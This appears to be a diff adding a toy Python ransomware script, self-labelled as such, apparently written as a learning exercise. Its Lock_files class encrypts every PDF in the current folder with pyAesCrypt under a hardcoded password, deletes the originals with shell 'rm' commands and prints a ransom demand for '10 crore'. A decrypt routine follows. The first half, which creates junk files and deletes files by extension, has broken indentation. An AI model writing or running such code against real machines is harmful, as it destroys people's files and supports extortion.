@@ -1,0 +1,99 @@
+ import os #ransomware encrypting files
+from subprocess import PIPE, run
+
+def cmd(command):
+  result = run(command, stdout=PIPE, universal_newlines=True, shell=True)
+  return result.stdout
+  
+  
+  
+  
+  with open("new_file.pdf","w") as outp:
+   outp.write("this is goutham")
+   
+   
+   
+   
+   def junk_file_creator(count):
+  for number in range(count):
+    with open(f"file_{number}.pdf","w") as outp:
+      outp.write(f"i created this file {number}today")
+      
+      
+  junk_file_creator(10)
+  
+  
+  
+  
+  
+  
+  def delete_file(extension):
+  cmd(f"rm *.{extension}")
+
+delete_file("grv")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import pyAesCrypt #to import a module py(thon) Aes(encrypt algo) Crypt(hidden lang) pre-written code
+from subprocess import PIPE, run
+
+def cmd(command):
+    result = run(command, stdout=PIPE, universal_newlines=True, shell=True)
+    return result.stdout
+
+class Lock_files:
+
+    def __init__(self):
+        self.password = "gaurav"
+        self.bufferSize = 64 * 1024
+        self.list_of_files = []
+        self.list_of_enc_files= [] 
+
+    def get_all_grv_files(self):
+        self.list_of_files = cmd("find *.pdf").split()
+        return True
+    
+    def get_all_encrypted_file(self):
+        self.list_of_enc_files = cmd("find *.aes").split()
+        return True
+
+    def encrypt_files(self):
+        got_grv_files = self.get_all_grv_files()
+        if got_grv_files:
+            for file in self.list_of_files:
+                pyAesCrypt.encryptFile(file, f"{file.strip('.pdf')}.aes", self.password, self.bufferSize)
+                cmd(f"rm {file}")
+                print(f"encrypted {file} and deleted it")
+        print("Hahahahaha! I have encrypted all your files, Give me 10 crore to get all the files")
+    
+    def obtain_original_file(self):
+        got_enc_files = self.get_all_encrypted_file()
+        if got_enc_files:
+            for file in self.list_of_enc_files:
+                pyAesCrypt.decryptFile(file, f"{file.strip('.aes')}.pdf", self.password, self.bufferSize)
+                cmd(f"rm {file}")
+                print(f"encrypted {file} and deleted it")
+
+
+enc_object = Lock_files()
+#enc_object.encrypt_files()
+enc_object.obtain_original_file()
+
+!pip install pyAesCrypt
+
+
+
+
